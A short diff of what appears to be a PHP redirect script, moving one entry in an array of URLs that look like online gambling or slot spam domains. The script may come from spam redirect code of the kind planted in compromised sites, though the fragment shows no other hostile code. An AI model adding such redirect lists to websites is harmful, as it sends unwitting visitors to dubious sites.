@@ -2,8 +2,8 @@
 // Array of URLs to redirect to
 $urls = [
     'https://sateslot77.info',
-    'https://megaforwinasik.xyz',
     'https://buditogel4d.online',
+    'https://megaforwinasik.xyz',
     'https://nasgorbetkecap.online',
     // Add more URLs here
 ];
